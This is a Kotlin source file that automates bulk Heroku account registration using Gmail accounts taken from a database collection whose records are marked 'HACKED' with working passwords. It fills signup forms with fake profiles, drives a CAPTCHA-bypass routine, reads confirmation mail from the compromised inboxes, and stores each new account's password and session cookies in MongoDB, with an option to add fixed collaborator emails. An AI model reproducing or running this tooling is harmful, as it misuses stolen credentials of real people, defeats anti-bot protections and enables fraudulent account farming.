package net.scr0pt.thirdservice.heroku

import com.mongodb.client.MongoClients
import com.mongodb.client.MongoCollection
import com.mongodb.client.model.Updates
import net.scr0pt.crawl.school.random
import net.scr0pt.selenium.*
import net.scr0pt.thirdservice.mongodb.MongoConnection
import net.scr0pt.thirdservice.openload.bypassCaptcha
import net.scr0pt.utils.FakeProfileV2
import net.scr0pt.utils.RobotManager
import net.scr0pt.utils.tempmail.Gmail
import net.scr0pt.utils.tempmail.event.MailReceiveEvent
import net.scr0pt.utils.tempmail.models.Mail
import net.scr0pt.utils.webdriver.DriverManager
import org.apache.commons.lang3.RandomUtils
import org.bson.Document
import java.awt.event.KeyEvent

/**
 * Created by Long
 * Date: 10/18/2019
 * Time: 9:11 PM
 */

fun main(args: Array<String>) {
    HerokuGeneric().run()
}

class HerokuRegister(
        val herokuCollection: MongoCollection<Document>,
        val gmailUsername: String,
        val gmailPassword: String,
        val firstName: String,
        val lastName: String,
        val email: String,
        val password: String = "Bruce_${System.currentTimeMillis()}",
        val appName: String) {
    val collaboratorEmailList = arrayListOf(
            "brucealmighty5daeae612ce20558@gmail.com",
            "alphahoai@gmail.com"
    )
    val robotManager = RobotManager()
    var isDone = false

    fun run() {
        println(gmailUsername)
        println(firstName)
        println(lastName)
        registerHerokuRobot()
    }

    fun registerHerokuRobot() {
        with(robotManager) {
            openBrowser()
            for(i in 0..20){
                if(isInputReady()) break
            }

            browserGoTo("https://signup.heroku.com")

            for(i in 0..20){
                if(isInputReady()) break            }

            robot.keyPress(KeyEvent.VK_HOME)
            robot.keyRelease(KeyEvent.VK_HOME)

            clearAndPasteInput(firstName)

            tab()
            clearAndPasteInput(lastName)

            tab()
            clearAndPasteInput(email)

            tab()

//ignore company name

            tab()//role
            for (i in 0..(RandomUtils.nextInt(1, 7))) {
                robot.keyPress(KeyEvent.VK_DOWN)
                robot.keyRelease(KeyEvent.VK_DOWN)
                sleep()
            }


            tab()//country default VN
            robot.keyPress(KeyEvent.VK_HOME)
            robot.keyRelease(KeyEvent.VK_HOME)
            sleep()
            robot.keyPress(KeyEvent.VK_DOWN)
            robot.keyRelease(KeyEvent.VK_DOWN)
//            for (i in 0..(RandomUtils.nextInt(1, 242))) {
//                robot.keyPress(KeyEvent.VK_DOWN)
//                robot.keyRelease(KeyEvent.VK_DOWN)
//            }

            tab()//programing language
            for (i in 0..(RandomUtils.nextInt(1, 12))) {
                robot.keyPress(KeyEvent.VK_DOWN)
                robot.keyRelease(KeyEvent.VK_DOWN)
                sleep()
            }

            tab()//captcha button
            robot.keyPress(KeyEvent.VK_ENTER)
            robot.keyRelease(KeyEvent.VK_ENTER)
            sleep()
            robot.keyPress(KeyEvent.VK_END)
            robot.keyRelease(KeyEvent.VK_END)
            sleep()

            doooo()
        }
    }

    private fun doooo() {
        with(robotManager) {
            //            val baseX = 1170
            val baseX = 900
//            val initialResolveCaptchaBtn = Pair<Int, Int>(750, screenSize.height - 80)
            val initialResolveCaptchaBtn = Pair<Int, Int>(470, screenSize.height - 75)
//            val newCapthchaBtn = Pair<Int, Int>(870, screenSize.height - 190)
            val newCapthchaBtn = Pair<Int, Int>(595, 580)
//            val multipleCorrect = Pair<Int, Int>(870, screenSize.height - 160)
            val multipleCorrect = Pair<Int, Int>(590, 590)
            val createNewAccountBtn = Pair<Int, Int>(baseX, screenSize.height - 200)
            val registerTime = System.currentTimeMillis()
            println("doooo 1")
            bypassCaptcha(initialResolveCaptchaBtn, multipleCorrect, newCapthchaBtn, robotManager, onSuccess = {
                println("doooo 2")

                click(createNewAccountBtn)//create btn
                longSleep()


                for (i in 0..20) {
                    println("doooo 3")
                    sleep()
                    click(screenSize.width / 4, screenSize.height / 2)//safe point screen

                    val txt = printScreenText()

                    if (txt == "Retry later!") {
                        println("doooo 3.5")
                        closeWindow()
                        isDone = true
                        return@bypassCaptcha
                    } else if (txt.contains("We could not verify you are not a robot. Please try the CAPTCHA again.")) {
                        println("doooo 4")
                        robot.keyPress(KeyEvent.VK_END)
                        robot.keyRelease(KeyEvent.VK_END)
                        sleep()

                        //capthca position
                        click(baseX, screenSize.height - 300)

                        doooo()
                        return@bypassCaptcha
                    } else if (txt.contains("Sorry. A user with that email address already exists, or the email was invalid.")
                            || txt.contains("Help us make some avocado toast!")
                    ) {
                        println("doooo 5")
                        isDone = true
                        closeWindow()
                        sleep()
                        return@bypassCaptcha
                    } else if (txt.contains("Almost there …\nPlease check your email") && txt.contains("to confirm your account.")) {
                        println("doooo 6")
                        closeWindow()
                        watingEmailConfirm(registerTime)
                        return@bypassCaptcha
                    }
                }
            }, onFail = {
                isDone = true
                closeWindow()
            })
        }
    }

    private fun watingEmailConfirm(registerTime: Long) {
        val driverManager = DriverManager(driverType = DriverManager.BrowserType.Firefox, driverHeadless = false)
        val pageManager = PageManager(driverManager)
        pageManager.addPageList(arrayListOf(
                HerokuSetYourPasswordPage(password = password) {
                    herokuCollection.updateOne(
                            Document("email", email),
                            Updates.set("verify", true)
                    )
                    println("HerokuSetYourPasswordPage success")
                }.apply {
                    onPageDetect = {
                        herokuCollection.insertOne(
                                Document("email", email)
                                        .append("password", password).append("firstName", firstName).append("lastName", lastName)
                                        .append("verify", true)
                        )
                    }
                },
                HerokuWelcomePage(),
                HerokuDashboardPage(action = HerokuDashboardPage.HerokuDashboardAction.CREATE_NEW_APP).apply {
                    onPageDetect = {
                        herokuCollection.updateOne(
                                Document("email", email),
                                Updates.set("cookies", pageManager.driver.cookieStr)
                        )
                    }
                },
                HerokuCreateNewAppPage(appName = appName) {
                    herokuCollection.updateOne(Document("email", email), Updates.set("appName", appName))
                    println("HerokuCreateNewAppPage ${appName} success")
                },
                HerokuDeployPagePage(),
                HerokuAccessPage(actionType = HerokuAccessPage.ActionType.ENDPAGE)
                /* HerokuAccessPage(collaboratorEmailList = collaboratorEmailList) {
                     println("HerokuAccessPage ${collaboratorEmailList.joinToString(", ")} success")
                 }*/
        ))
        pageManager.gmail = Gmail(gmailUsername, gmailPassword).apply {
            maxMailPerFolder = 3
            onEvent(MailReceiveEvent(
                    key = "ona_heroku_sender",
                    validator = { mail ->
                        mail.receivedDate > registerTime
                                && Mail.CompareType.EQUAL_IGNORECASE.compare(mail.from, "noreply@heroku.com")
                                && Mail.CompareType.EQUAL_IGNORECASE.compare(mail.subject, "Confirm your account on Heroku")
                    },
                    callback = { mails ->
                        val mail =
                                mails.firstOrNull { it.content?.contains("Thanks for signing up with Heroku! You must follow this link to activate your account:") == true }
                        mail?.contentDocumented?.selectFirst("a[href^='https://id.heroku.com/account/accept/']")?.attr("href")?.let {
                            this.logout()
                            driverManager.get(it)
                        }
                    },
                    once = false,
                    new = true,
                    fetchContent = true
            )
            )
            connect()
        }

        pageManager.run { pageResponse ->
            println(pageResponse)
            if (pageResponse is HerokuResponse.COLLABORATOR_ADDED) {
                herokuCollection.updateOne(
                        Document("email", email),
                        Updates.pushEach("collaborators", collaboratorEmailList)
                )
            }
            pageManager.driver.close()
            isDone = true
        }
    }

}

class HerokuGeneric {
    val mongoClient = MongoClients.create(MongoConnection.eduConnection)
    val accountDatabase = mongoClient.getDatabase("edu-school-account")
    val eduCollection = accountDatabase.getCollection("vimaru-email-info")

    val mongoClient2 =
            MongoClients.create(MongoConnection.megaConnection)
    val herokuDatabase = mongoClient2.getDatabase("heroku")
    val herokuCollection = herokuDatabase.getCollection("heroku-account")

    fun run() {
        while (true) {
            val doc = eduCollection.random(Document("login_status", "PASSWORD_CORRECT").append("email_status", "HACKED"))
            if (doc != null && doc.containsKey("Allow less secure apps")) {
                val gmailUsername = doc.getString("email")
                val result = FakeProfileV2.getNewProfile() ?: continue
                if (herokuCollection.countDocuments(Document("email", gmailUsername)) > 0L) continue
                HerokuRegister(
                        gmailUsername = gmailUsername,
                        gmailPassword = doc.getString("new_pass") ?: doc.getString("pass"),
                        firstName = result.firstName,
                        lastName = result.lastName,
                        appName = result.username.toLowerCase(),
                        email = gmailUsername,
                        herokuCollection = herokuCollection
                ).apply {
                    run()
                    while (!isDone) Thread.sleep(5000)
                }
            }
        }
    }
}


class HerokuRegisterPage(
        val firstName: String,
        val lastName: String,
        val email: String,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun action(pageStatus: PageStatus): Response {
        try {
            pageStatus.driver.executeScript(
                    """
                    function randInt(max, min){
                        return Math.floor(Math.random() * (+max - +min + 1)) + +min;
                    }
                    var signupForm = document.querySelector("form.signup-form");
                    signupForm.first_name.value = "${firstName}";
                    signupForm.last_name.value = "${lastName}";
                    signupForm.email.value = "${email}";
                    signupForm.role.value = signupForm.role[randInt(1, signupForm.role.length - 1)].value;
                    signupForm.self_declared_country.value = signupForm.self_declared_country[randInt(1, signupForm.role.length - 1)].value;
                    signupForm.main_programming_language.value = signupForm.main_programming_language[randInt(1, signupForm.role.length - 1)].value;
                    
                    document.querySelector('input[value="Create Free Account"]').click();
                    
        """.trimIndent()
            )
        } catch (e: Exception) {
        }

        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus) =
            pageStatus.title == "Heroku | Sign up" &&
                    pageStatus.url.startsWith("https://signup.heroku.com") &&
                    pageStatus.equalsText(".header-main h2", "Sign up for free and experience Heroku today")
}

class HerokuRegisterDoneWaitingCheckEmailPage(
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://signup.heroku.com/account") &&
                    pageStatus.notContain(".header-main h2") &&
                    pageStatus.equalsText(".account-page .account-content h2", "Almost there …") &&
                    pageStatus.contain(".account-page .account-content h3", "Please check your email")
}

class HerokuSetYourPasswordPage(
        val password: String,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun action(pageStatus: PageStatus): Response {
        pageStatus.driver.sendKeysFirstEl(password, "input#user_password") ?: return Response.NOT_FOUND_ELEMENT()
        pageStatus.driver.sendKeysFirstEl(password, "input#user_password_confirmation")
                ?: return Response.NOT_FOUND_ELEMENT()
        pageStatus.driver.clickFirstEl("form.signup-form.confirmation-form .input-group input[type=\"submit\"]")
                ?: return Response.NOT_FOUND_ELEMENT()
        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://signup.heroku.com/confirm") &&
                    pageStatus.notContain(".header-main h2") &&
                    pageStatus.equalsText(".account-page .account-content h2", "Set your password") &&
                    pageStatus.equalsText(".account-page .account-content h3", "Create your password and log in to your Heroku account.")
}


class HerokuWelcomePage(
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun action(pageStatus: PageStatus): Response {
        pageStatus.driver.clickFirstEl("form#final_login .center input[type=\"submit\"]")
                ?: return Response.NOT_FOUND_ELEMENT()
        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://signup.heroku.com/account/accept/ok") &&
                    pageStatus.notContain(".header-main h2") &&
                    pageStatus.equalsText(".account-page .account-content h2", "Welcome to Heroku") &&
                    pageStatus.notContain(".account-page .account-content h3") &&
                    pageStatus.doc?.selectFirst("form#final_login .center input[type=\"submit\"]")?.attr("value") == "Click here to proceed"
}


class HerokuCreateNewAppPage(
        val appName: String,
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun action(pageStatus: PageStatus): Response {
        pageStatus.driver.sendKeysFirstEl(appName, "form.new-app-view .new-app-name input")
                ?: return Response.NOT_FOUND_ELEMENT()
        pageStatus.driver.clickFirstEl("form.new-app-view button.create-app-button")
                ?: return Response.NOT_FOUND_ELEMENT()
        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://dashboard.heroku.com/new-app")
}

class HerokuDeployPagePage(
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun action(pageStatus: PageStatus): Response {
        pageStatus.driver.get(pageStatus.url.substringBefore("/deploy") + "/access")
        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://dashboard.heroku.com/apps/") &&
                    pageStatus.url.contains("/deploy/heroku-git")
}


class HerokuAccessPage(
        val actionType: ActionType = ActionType.IGNORE,
        collaboratorEmailList: ArrayList<String> = arrayListOf(),
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    enum class ActionType {
        ADDCOLLABORATOREMAILLIST, IGNORE, ENDPAGE
    }

    data class AddingCollaboratorEmailStatus(val collaboratorEmail: String, var isAdded: Boolean = false)

    private val collaboratorEmailObjectList: List<AddingCollaboratorEmailStatus> = collaboratorEmailList.map { AddingCollaboratorEmailStatus(it) }

    override fun onWaiting(pageStatus: PageStatus): Response? {
        when (actionType) {
            ActionType.ADDCOLLABORATOREMAILLIST -> {
                pageStatus.doc?.select(".collaborator-list tr.collaborator-item")?.forEach {
                    val txt = it.text().trim()
                    val email = txt.split(" ")[0]
//            val role = txt.split(" ")[1]

                    collaboratorEmailObjectList.firstOrNull { collaboratorEmail -> collaboratorEmail.collaboratorEmail == email }?.let {
                        it.isAdded = true
                    }
                }

                if (collaboratorEmailObjectList.firstOrNull { !it.isAdded } == null) {
                    return HerokuResponse.COLLABORATOR_ADDED()
                }
            }
            ActionType.IGNORE -> {

            }
            ActionType.ENDPAGE -> {
                return Response.OK()
            }
        }

        return null
    }

    override fun action(pageStatus: PageStatus): Response {
        when (actionType) {
            ActionType.ADDCOLLABORATOREMAILLIST -> {
                collaboratorEmailObjectList.forEach {
                    val collaboratorEmail = it.collaboratorEmail
                    pageStatus.driver.clickFirstEl("button.hk-button--secondary", equals = "Add collaborator")
                            ?: return@action Response.NOT_FOUND_ELEMENT()
                    pageStatus.driver.sendKeysFirstEl(collaboratorEmail, "input", filter = { el -> "user@domain.com".equals(el.getAttribute("placeholder"), ignoreCase = true) })
                            ?: return@action Response.NOT_FOUND_ELEMENT()
                    pageStatus.driver.clickFirstEl("button.hk-button--primary", equals = "Save changes")
                            ?: return@action Response.NOT_FOUND_ELEMENT()
                    Thread.sleep(2000)
                }
            }
            ActionType.IGNORE -> {

            }
            ActionType.ENDPAGE -> {
                return Response.OK()
            }
        }

        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://dashboard.heroku.com/apps/") &&
                    pageStatus.url.contains("/access")
}


class GoogleGmailPage(
        onPageFinish: (() -> Unit)? = null
) : Page(onPageFinish = onPageFinish) {
    override fun action(pageStatus: PageStatus): Response {
        val link = pageStatus.html.substringAfter("Thanks for signing up with Heroku! You must follow this link to activate your account: ")?.substringBefore("Have fun")?.trim()
        if (link.startsWith("https://id.heroku.com/account/accept/")) {
            pageStatus.driver.get(link)
        }
        return Response.WAITING()
    }

    override fun detect(pageStatus: PageStatus): Boolean =
            pageStatus.url.startsWith("https://mail.google.com/mail/") &&
                    pageStatus.html.contains("Thanks for signing up with Heroku! You must follow this link to activate your account") &&
                    pageStatus.html.contains("https://id.heroku.com/account/accept/") &&
                    pageStatus.html.contains("Have fun")
}
